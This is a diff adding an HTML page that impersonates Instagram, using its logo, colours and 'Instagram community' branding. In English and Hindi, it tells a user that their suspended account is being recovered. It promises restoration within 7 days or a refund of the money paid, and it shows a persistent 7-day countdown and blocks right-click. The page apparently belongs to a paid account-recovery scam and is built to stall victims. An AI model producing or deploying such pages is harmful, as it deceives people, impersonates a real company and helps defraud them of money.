@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recovery Process Pending</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+        }
+        
+        body {
+            background-color: #0a0a0a;
+            color: #fff;
+            /* Changed background to a dark theme suitable for Instagram vibe or keep generic dark */
+            background-image: linear-gradient(45deg, #2c1021, #0a0a0a); 
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            position: relative;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        /* Removed the heavy image overlay, kept a subtle gradient overlay */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(131, 58, 180, 0.1) 0%, rgba(0, 0, 0, 0.8) 100%);
+            z-index: -1;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 100%;
+            margin: 0;
+            padding: 20px;
+            background-color: rgba(20, 20, 20, 0.6);
+            animation: fadeIn 1s ease-in-out;
+            position: relative;
+            z-index: 1;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+        }
+        
+        .logo {
+            width: auto;
+            max-width: 150px;
+            height: auto;
+            /* Changed animation name */
+            animation: glowLogoInsta 2s infinite alternate;
+        }
+        
+        .logo img {
+            width: 100%;
+            height: auto;
+            max-height: 60px; /* Adjusted for Insta logo */
+            object-fit: contain;
+        }
+        
+        /* Updated Glow Color to Instagram Pink/Purple */
+        @keyframes glowLogoInsta {
+            0% { filter: drop-shadow(0 0 5px rgba(193, 53, 132, 0.7)); }
+            100% { filter: drop-shadow(0 0 20px rgba(225, 48, 108, 1)); }
+        }
+        
+        .language-toggle {
+            /* Instagram Gradient Button */
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: #fff;
+            border: none;
+            padding: 10px 15px;
+            font-size: 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 3px 10px rgba(225, 48, 108, 0.4);
+        }
+        
+        .language-toggle:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.6);
+        }
+        
+        .language-toggle:active {
+            transform: translateY(1px);
+        }
+        
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            flex: 1;
+        }
+        
+        .text-container {
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto 20px;
+        }
+        
+        h1 {
+            font-size: 22px;
+            color: #E1306C; /* Instagram Pink */
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            color: #ddd;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .highlight {
+            color: #C13584; /* Instagram Purple */
+            font-weight: bold;
+        }
+        
+        .english-text {
+            display: block;
+        }
+        
+        .hindi-text {
+            display: none;
+        }
+        
+        /* Loading image animation */
+        .unlock-image {
+            height: 24px;
+            width: auto;
+            animation: loadingInstaGlow 2s infinite;
+        }
+        
+        /* Updated Loading Glow */
+        @keyframes loadingInstaGlow {
+            0% { opacity: 0.7; transform: scale(0.95); filter: drop-shadow(0 0 5px rgba(193, 53, 132, 0.7)); }
+            50% { opacity: 1; transform: scale(1.05); filter: drop-shadow(0 0 15px rgba(225, 48, 108, 1)); }
+            100% { opacity: 0.7; transform: scale(0.95); filter: drop-shadow(0 0 5px rgba(193, 53, 132, 0.7)); }
+        }
+        
+        .countdown-container {
+            background-color: rgba(20, 20, 20, 0.8);
+            border: 1px solid #333;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: center;
+            width: 100%;
+            border-radius: 10px;
+        }
+        
+        .countdown-title {
+            font-size: 1.3rem;
+            color: #E1306C; /* Instagram Color */
+            margin-bottom: 10px;
+        }
+        
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .countdown-box {
+            background: linear-gradient(135deg, #222, #111);
+            padding: 10px;
+            min-width: 70px;
+            border-radius: 5px;
+            border-bottom: 2px solid #C13584;
+        }
+        
+        .countdown-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #E1306C; /* Instagram Color */
+        }
+        
+        .countdown-label {
+            font-size: 0.8rem;
+            color: #ddd;
+            margin-top: 5px;
+        }
+        
+        /* Man image with even slower insta glow */
+        .man-image-container {
+            margin-top: 10px;
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .bottom-loading-container {
+            margin: 20px auto 10px auto;
+            text-align: center;
+        }
+        
+        .man-image {
+            max-width: 100%;
+            height: auto;
+            animation: verySlowInstaEffect 8s infinite alternate;
+        }
+        
+        @keyframes verySlowInstaEffect {
+            0% { filter: drop-shadow(0 0 5px rgba(131, 58, 180, 0.5)); }
+            100% { filter: drop-shadow(0 0 20px rgba(225, 48, 108, 0.9)); }
+        }
+        
+        @media (max-width: 800px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .content {
+                flex-direction: column;
+                text-align: left;
+            }
+            
+            .text-container {
+                margin-right: 0;
+                margin-bottom: 20px;
+            }
+            
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .language-toggle {
+                margin-top: 15px;
+                align-self: flex-end;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            p {
+                font-size: 16px;
+            }
+            
+            .countdown-timer {
+                flex-wrap: wrap;
+            }
+            
+            .countdown-box {
+                min-width: 60px;
+            }
+            
+            .countdown-value {
+                font-size: 1.5rem;
+            }
+            
+            .man-image {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+        
+        @media (min-width: 801px) {
+            .man-image {
+                max-width: 500px;
+                height: auto;
+            }
+            
+            .content {
+                justify-content: space-between;
+                min-height: calc(100vh - 200px);
+            }
+            
+            .countdown-container {
+                margin-top: auto;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+            </div>
+            <button class="language-toggle" id="languageToggle">Translate to Hindi</button>
+        </div>
+        
+        <div class="content">
+            <div class="text-container">
+                <div class="english-text" id="englishText">
+                    <h1>Your Instagram Account Recovery is currently in progress. Please don't worry!</h1>
+                    <p>We have successfully initiated the recovery process for your suspended/disabled <span class="highlight">Instagram ID</span>. The system has received your appeal, and your account is currently under review. 
+                    Typically, accounts are restored instantly, but in your case, it requires a manual check which might take some time. Please wait for 24 to 48 hours, after which your suspension will be lifted.
+                    If, for any reason, it is not restored within this time, it will definitely be recovered within 7 days—this is our promise. In the rare case it doesn't get enabled, you will receive a full refund of the amount you paid. So, please relax.
+                    Thank you for your patience and for being a valued part of the <span class="highlight">Instagram community</span>!</p>
+                </div>
+                
+                <div class="hindi-text" id="hindiText">
+                    <h1>Aapka Instagram Account Recovery Process shuru ho chuka hai. Kripya chinta na karein!</h1>
+                    <p>Humne aapki suspended/disabled <span class="highlight">Instagram ID</span> ko recover karne ka process shuru kar diya hai. System ne aapki request le li hai aur abhi aapka account review mein hai.
+                    Aam taur par account turant wapas aa jata hai, lekin aapke case mein thoda samay lag sakta hai. Kripya 24 se 48 ghante tak intezar karein, uske baad aapka account wapas chalu ho jayega.
+                    Agar kisi wajah se fir bhi enable nahi hota hai, to yeh pakka 7 din ke andar recover ho jayega—yeh hamara wada hai. Aur agar tab bhi nahi hua, to jitna paisa aapne diya hai, utna pura refund mil jayega. To tension mat lijiye.
+                    Dhanyavad, <span class="highlight">Instagram community</span> par bharosa rakhne ke liye!</p>
+                </div>
+            </div>
+            
+            <div class="countdown-container">
+                <div class="countdown-title">Your account will be recovered in:</div>
+                <div class="countdown-timer">
+                    <div class="countdown-box">
+                        <div class="countdown-value" id="days">7</div>
+                        <div class="countdown-label">Days</div>
+                    </div>
+                    <div class="countdown-box">
+                        <div class="countdown-value" id="hours">0</div>
+                        <div class="countdown-label">Hours</div>
+                    </div>
+                    <div class="countdown-box">
+                        <div class="countdown-value" id="minutes">0</div>
+                        <div class="countdown-label">Minutes</div>
+                    </div>
+                    <div class="countdown-box">
+                        <div class="countdown-value" id="seconds">0</div>
+                        <div class="countdown-label">Seconds</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bottom-loading-container">
+                <img class="unlock-image" src="unlock-successful.gif" alt="Loading">
+            </div>
+            
+            <div class="man-image-container">
+                <img class="man-image" src="man.gif" alt="Man GIF">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Language toggle functionality
+            const languageToggle = document.getElementById('languageToggle');
+            const englishText = document.getElementById('englishText');
+            const hindiText = document.getElementById('hindiText');
+            
+            let isEnglish = true;
+            
+            languageToggle.addEventListener('click', function() {
+                if (isEnglish) {
+                    // Switch to Hindi
+                    englishText.style.display = 'none';
+                    hindiText.style.display = 'block';
+                    languageToggle.textContent = 'Translate to English';
+                } else {
+                    // Switch to English
+                    englishText.style.display = 'block';
+                    hindiText.style.display = 'none';
+                    languageToggle.textContent = 'Translate to Hindi';
+                }
+                
+                isEnglish = !isEnglish;
+            });
+            
+            // Persistent countdown functionality
+            const daysElement = document.getElementById('days');
+            const hoursElement = document.getElementById('hours');
+            const minutesElement = document.getElementById('minutes');
+            const secondsElement = document.getElementById('seconds');
+            
+            // Generate a unique identifier for this device/browser
+            function generateDeviceId() {
+                // Changed key to match theme update
+                let deviceId = localStorage.getItem('instaDeviceId');
+                if (!deviceId) {
+                    deviceId = 'device_' + Math.random().toString(36).substring(2, 15);
+                    localStorage.setItem('instaDeviceId', deviceId);
+                }
+                return deviceId;
+            }
+            
+            const deviceId = generateDeviceId();
+            
+            // Check if countdown has already started for this device
+            function getCountdownEndTime() {
+                // Changed key to match theme update
+                const savedEndTime = localStorage.getItem(`instaCountdownEnd_${deviceId}`);
+                if (savedEndTime) {
+                    return parseInt(savedEndTime);
+                }
+                
+                // If not started yet, set end time to 7 days from now
+                const endTime = Date.now() + (7 * 24 * 60 * 60 * 1000); // 7 days in milliseconds
+                localStorage.setItem(`instaCountdownEnd_${deviceId}`, endTime.toString());
+                return endTime;
+            }
+            
+            const countdownEndTime = getCountdownEndTime();
+            
+            // Update countdown timer
+            function updateCountdown() {
+                const currentTime = Date.now();
+                const timeRemaining = countdownEndTime - currentTime;
+                
+                if (timeRemaining <= 0) {
+                    // Countdown finished
+                    daysElement.textContent = '0';
+                    hoursElement.textContent = '0';
+                    minutesElement.textContent = '0';
+                    secondsElement.textContent = '0';
+                    return;
+                }
+                
+                // Calculate remaining time
+                const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
+                
+                // Update the display
+                daysElement.textContent = days;
+                hoursElement.textContent = hours;
+                minutesElement.textContent = minutes;
+                secondsElement.textContent = seconds;
+            }
+            
+            // Initial update
+            updateCountdown();
+            
+            // Update countdown every second
+            setInterval(updateCountdown, 1000);
+            
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+        });
+    </script>
+</body>
+</html>
